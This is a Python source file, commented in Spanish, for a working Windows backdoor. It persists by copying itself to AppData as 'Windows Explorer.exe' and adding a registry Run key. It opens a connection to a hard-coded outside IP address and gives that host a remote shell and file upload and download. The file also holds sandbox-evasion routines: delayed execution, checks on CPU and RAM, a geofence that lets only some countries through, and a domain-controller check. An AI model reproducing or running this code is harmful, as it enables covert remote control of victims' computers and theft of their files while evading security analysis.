#!/usr/bin/python

import datetime
import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import requests
import time
from bs4 import BeautifulSoup
from ctypes import windll

class Backdoor:

    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(r'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

            return "[+] Persistencia correcta ${}"

    def reliable_send(self, data):
        if isinstance(data, bytes):
            data = data.decode("utf-8", "ignore")
        json_data = json.dumps(data, ensure_ascii=False)
        self.connection.send(json_data.encode("utf-8"))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(4096)
                return json.loads(json_data.decode("utf-8", "ignore"))
            except ValueError:
                continue

    def execute_system_commmand(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode("utf-8", "ignore")

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changed working directory to " + path

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()

                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])

                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode("utf-8")

                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])

                else:
                    # Procesar comando raw
                    raw_command = " ".join(command)
                    command_result = self.execute_system_commmand(raw_command)

            except Exception as e:
                command_result = f"[-] Error during command execution: {str(e)}"

            self.reliable_send(command_result)

class SandBoxEvasion:
    def __init__(self):
        pass

    def dormir(self, activar: bool, fecha_personalizada: datetime.datetime = None, tiempo_relativo_minutos: int = None):
        """
        Función que pausa o determina la ejecución del programa basado en fechas y tiempo relativo.
        """
        if not activar:
            print("[✓] Evasión por fecha desactivada. Continuando ejecución.")
            return

        ahora = datetime.datetime.now()

        # Verifica tiempo relativo
        if tiempo_relativo_minutos is not None:
            tiempo_fin = ahora + datetime.timedelta(minutes=tiempo_relativo_minutos)
            while datetime.datetime.now() < tiempo_fin:
                tiempo_restante = (tiempo_fin - datetime.datetime.now()).total_seconds()
                print(f"[...] Esperando {int(tiempo_restante)} segundos restantes...")
                time.sleep(1)

            print(f"[✓] Tiempo relativo de {tiempo_relativo_minutos} minutos alcanzado. Continuando ejecución.")
            return

        # Verifica si hay una fecha personalizada
        if fecha_personalizada:
            while datetime.datetime.now() < fecha_personalizada:
                tiempo_restante = (fecha_personalizada - datetime.datetime.now()).total_seconds()
                print(f"[...] Esperando {int(tiempo_restante)} segundos para alcanzar la fecha personalizada...")
                time.sleep(1)

            print("[✓] Fecha personalizada alcanzada. Continuando ejecución.")
            return

        print("[-] Fecha no válida. Terminando ejecución.")
        sys.exit()

    def ejecutar_systeminfo(self):
        """
        Ejecuta el comando systeminfo y analiza el resultado para determinar si está en un entorno de baja capacidad.
        Si hay solo un procesador o menos de 4 GB de RAM, termina la ejecución.
        """
        try:
            resultado = subprocess.check_output("systeminfo", shell=True, text=True)
            print("[+] Comando systeminfo ejecutado con éxito.")

            # Buscar información relevante en el resultado
            procesadores = "Procesador(es):"
            memoria = "Memoria física total"

            num_procesadores_line = next((line for line in resultado.splitlines() if procesadores in line), None)
            memoria_line = next((line for line in resultado.splitlines() if memoria in line), None)

            num_procesadores = int(num_procesadores_line.split()[2]) if num_procesadores_line else 0

            if memoria_line:
                memoria_gb = int(memoria_line.split()[3].replace(",", "")) / 1024  # Convertir a GB
            else:
                memoria_gb = 0

            if num_procesadores <= 1 or memoria_gb < 4:
                print("[-] Entorno sospechoso detectado (1 procesador o <4GB de RAM). Terminando ejecución.")
                sys.exit()

            print("[+] Entorno válido detectado. Continuando ejecución.")
        except Exception as e:
            print(f"[-] Error al ejecutar systeminfo: {e}")
            sys.exit()

    def obtener_informacion_ip(self, paises_permitidos=None):
        """
        Consulta ifconfig.me/all.json para obtener la dirección IP pública y luego consulta el servicio RDAP
        para determinar el país asociado a la IP. Si no se encuentra el país, intenta extraerlo de la etiqueta "label".
        Luego verifica si el país está en la lista de países permitidos.

        :param paises_permitidos: list - Lista de países permitidos (códigos ISO 3166-1 alpha-2).
        """
        try:
            # Obtener información desde ifconfig.me
            response = requests.get("https://ifconfig.me/all.json")
            response.raise_for_status()

            ip_data = response.json()
            ip_address = ip_data.get("ip_addr")

            if not ip_address:
                print("[-] No se pudo obtener la dirección IP.")
                return

            print(f"[+] Dirección IP obtenida: {ip_address}")

            # Consultar RDAP para obtener el país
            rdap_response = requests.get(f"https://rdap.apnic.net/ip/{ip_address}")
            rdap_response.raise_for_status()

            rdap_data = rdap_response.json()
            country = rdap_data.get("country")

            if not country:
                # Intentar extraer desde la etiqueta "label"
                entities = rdap_data.get("entities", [])
                for entity in entities:
                    label = entity.get("vcardArray", [[], []])[1]
                    for item in label:
                        if isinstance(item, list) and item[0] == "adr":
                            label_data = item[1].get("label", "")
                            country = label_data.split("\n")[-1]  # Tomar el dato antes del salto de línea
                            break
                if not country:
                    country = "Desconocido"

            print(f"[+] País asociado a la IP: {country}")

            # Verificar si el país está en la lista de permitidos
            if paises_permitidos and country not in paises_permitidos:
                print(f"[-] País {country} no está en la lista de países permitidos. Terminando ejecución.")
                sys.exit()

            print(f"[+] País {country} está permitido. Continuando ejecución.")

        except requests.RequestException as e:
            print(f"[-] Error al realizar la consulta: {e}")
        except Exception as e:
            print(f"[-] Error inesperado: {e}")

    def is_domain_controller(self):
        """
        Verifica si el sistema está asociado a un controlador de dominio.
        """
        try:
            dc_name = windll.netapi32.NetGetDCName(None, None)
            if dc_name:
                print(f"[+] Controlador de dominio detectado: {dc_name}")
                return True
            else:
                print("[-] No se detectó un controlador de dominio.")
                return False
        except Exception as e:
            print(f"[-] Error al verificar el controlador de dominio: {e}")
            return False

if __name__ == "__main__":
    sandbox = SandBoxEvasion()

    # Ejemplo de uso de la función dormir
    sandbox.dormir(activar=True, fecha_personalizada=datetime.datetime(2024, 12, 25, 0, 0), tiempo_relativo_minutos=2)

    # Ejecutar análisis de systeminfo
    sandbox.ejecutar_systeminfo()

    # Obtener información de IP con lista de países permitidos
    paises_permitidos = ["MX", "US"]
    sandbox.obtener_informacion_ip(paises_permitidos=paises_permitidos)

    # Verificar asociación a controlador de dominio
    #sandbox.is_domain_controller()

try:
    my_backdoor = Backdoor("44.208.30.126", 1234)
    my_backdoor.run()
except Exception:
    sys.exit()
